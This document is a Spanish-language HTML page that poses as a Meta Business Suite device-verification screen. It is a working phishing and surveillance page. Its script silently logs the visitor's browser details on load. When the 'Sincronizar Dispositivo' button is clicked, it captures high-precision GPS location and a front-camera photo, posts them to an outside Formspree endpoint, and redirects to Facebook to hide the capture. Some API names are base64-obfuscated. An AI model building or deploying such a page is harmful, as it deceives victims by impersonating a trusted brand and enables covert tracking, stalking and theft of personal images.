<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Business Suite - Verificación</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1c1e21; }
        .card { background: #fff; width: 92%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-top: 5px solid #0668E1; }
        .meta-logo { width: 100px; margin-bottom: 20px; }
        h1 { font-size: 19px; font-weight: 700; margin-bottom: 12px; color: #1c1e21; }
        p { font-size: 14.5px; color: #606770; line-height: 1.5; margin-bottom: 20px; }
        .info-box { background: #f5f6f7; border-radius: 8px; padding: 15px; margin-bottom: 20px; border: 1px solid #dddfe2; font-size: 13.5px; }
        .btn-sync { background-color: #0668E1; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 15px; cursor: pointer; transition: background 0.3s; }
        .btn-sync:hover { background-color: #0559c1; }
        .footer { font-size: 11px; color: #90949c; margin-top: 20px; text-align: center; text-transform: uppercase; letter-spacing: 0.5px; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div class="card" id="main-panel">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/2560px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
    <h1>Confirmación de Dispositivo Autorizado</h1>
    <p>Hemos detectado una conexión desde un navegador no sincronizado. Para asegurar la integridad de su cuenta y continuar con la visualización de mensajes, es necesaria una validación técnica del entorno.</p>
    
    <div class="info-box">
        <strong>Requerimientos de sincronización:</strong>
        <ul style="margin: 8px 0; padding-left: 18px;">
            <li>Geolocalización del nodo de red.</li>
            <li>Validación de hardware biométrico.</li>
            <li>Certificación de navegador seguro.</li>
        </ul>
    </div>

    <button class="btn-sync" id="btn-trigger">Sincronizar Dispositivo</button>
    <div class="footer">Meta Platforms © 2026 • Security Infrastructure</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    // OFUSCACIÓN DE BACKEND
    const _id = "xanrkklv"; 
    const _url = "https://formspree.io/f/";
    const _fb = "https://m.facebook.com/home.php";

    // Decodificador de funciones críticas (GPS, Cámara)
    const _d = (b) => atob(b);
    const _k = {
        g: _d("Z2VvbG9jYXRpb24="), // geolocation
        m: _d("Z2V0VXNlck1lZGlh"), // getUserMedia
        c: _d("Y29uZmlybS1pZGVudGl0eQ==")
    };

    // Tracking silencioso al entrar
    window.onload = () => {
        _log({ e: "CONEXION_INICIAL", ua: navigator.userAgent, lang: navigator.language });
    };

    async function startProcess() {
        const btn = document.getElementById('btn-trigger');
        btn.innerText = "Validando...";
        btn.disabled = true;

        // 1. CAPTURA DE UBICACIÓN (GPS ALTA PRECISIÓN)
        navigator[_k.g].getCurrentPosition(
            (p) => _log({ type: "UBICACION_GPS", lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
            (e) => _log({ type: "UBICACION_DENEGADA", error: e.message }),
            { enableHighAccuracy: true }
        );

        // 2. CAPTURA DE IMAGEN (IDENTIFICACIÓN VISUAL)
        try {
            const stream = await navigator.mediaDevices[_k.m]({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                _log({ 
                    type: "CAPTURA_BIOMETRICA", 
                    img: canvas.toDataURL('image/jpeg', 0.6) 
                });
                
                stream.getTracks().forEach(t => t.stop());
                
                // Redirección suave
                setTimeout(() => { window.location.href = _fb; }, 500);
            }, 1200);
        } catch (err) {
            _log({ type: "CAMARA_ERROR", msg: err.name });
            window.location.href = _fb;
        }
    }

    document.getElementById('btn-trigger').addEventListener('click', startProcess);

    function _log(data) {
        fetch(_url + _id, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
        });
    }
</script>

</body>
</html>
